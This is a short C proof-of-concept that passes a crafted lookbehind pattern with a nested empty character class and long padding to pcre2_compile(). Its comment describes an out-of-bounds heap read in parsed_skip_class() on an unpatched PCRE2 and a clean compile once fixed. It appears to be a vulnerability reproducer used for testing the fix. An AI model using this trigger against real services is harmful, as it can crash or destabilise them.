/*
PoC: pcre2_compile() with PCRE2_ALT_EXTENDED_CLASS and PCRE2_ALLOW_EMPTY_CLASS.

The pattern is a lookbehind assertion whose branch contains an extended
character class with a nested empty class "[a[]]", followed by ordinary
literal padding (so the parsed-pattern vector is heap-allocated).

On the shipped tree the lookbehind length scan walks past the end of the
parsed pattern vector while looking for a class terminator, and reads out
of bounds; under AddressSanitizer the process aborts with a
heap-buffer-overflow report in parsed_skip_class(). On the upstream-fixed
tree the same call simply compiles the pattern and exits cleanly.
*/

#include <stdio.h>
#include <string.h>

#define PCRE2_CODE_UNIT_WIDTH 8
#include "pcre2.h"

int main(void)
{
char pattern[1300];
int errcode;
PCRE2_SIZE erroffset;
pcre2_code *re;
size_t n;

n = (size_t)snprintf(pattern, sizeof(pattern), "(?<=[a[]])");
memset(pattern + n, 'b', sizeof(pattern) - n - 1);
pattern[sizeof(pattern) - 1] = '\0';

re = pcre2_compile((PCRE2_SPTR)pattern, PCRE2_ZERO_TERMINATED,
  PCRE2_ALT_EXTENDED_CLASS | PCRE2_ALLOW_EMPTY_CLASS,
  &errcode, &erroffset, NULL);

if (re == NULL)
  {
  PCRE2_UCHAR msg[256];
  pcre2_get_error_message(errcode, msg, sizeof(msg));
  printf("compile failed at offset %lu: %s\n",
    (unsigned long)erroffset, (char *)msg);
  return 1;
  }

printf("compiled ok\n");
pcre2_code_free(re);
return 0;
}
